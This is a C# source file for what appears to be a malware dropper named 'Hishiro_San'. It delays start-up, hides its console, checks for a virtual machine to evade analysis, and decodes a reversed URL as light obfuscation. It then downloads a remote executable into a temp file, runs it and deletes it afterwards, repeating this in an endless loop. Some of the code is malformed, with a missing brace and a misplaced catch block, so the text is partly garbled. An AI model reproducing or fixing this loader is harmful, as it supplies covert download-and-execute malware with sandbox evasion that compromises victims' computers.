using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;
using System.Net;

namespace Hishiro_San
{
    class Program
    {


        const bool hideConsole = true; // Hide console 
        const bool CheckVM = true; // VM check function
        const string REMOTE_URL_REVERSED = "elgoog.moc";


        public static void DownloadFile()
        {
            string REMOTE_URL = ReverseText(REMOTE_URL_REVERSED); // Convert the url to it's original form
            string localPath = Path.GetTempFileName(); // Create a temp file on the disk

            if (File.Exists(localPath))
                File.Delete(localPath); // Remove the file : we only want its path

            localPath = localPath.Split('.')[0] + Path.GetExtension(REMOTE_URL); // Correct the extension (we dont want a .tmp file)

            try
            {
                new WebClient().DownloadFile(REMOTE_URL, localPath); // Download the file
            catch (WebException) { return; } // Error handling

            Process process = Process.Start(localPath); // Start the executable
            process.WaitForExit(); // Wait for it to end

            // Once the program is closed, clean things up

            if (File.Exists(localPath))
                File.Delete(localPath); // Cleanup
        }

        static string ReverseText(string input)
        {
            var stack = new Stack<char>();
            foreach (char c in input)
                stack.Push(c);

            var sb = new StringBuilder();
            while (stack.Count > 0)
                sb.Append(stack.Pop());

            return sb.ToString();

            catch

            {

                // ignored

            }



        }


        static void Main(string[] args)
        {
            System.Threading.Thread.Sleep(5000); // sleep for 5 seconds

            if (hideConsole)
                Kaizaki.HideWindow(); // hide window 

            while (true)
            {
                if (CheckVM) // check for vm condition if true
                {
                    try
                    {
                        Kaizaki.Virtual(); // detects virtual machine present
                        DownloadFile();

                    }

                    catch

                    {

                        // ignored

                    }


                }
            }
        }
    }
}
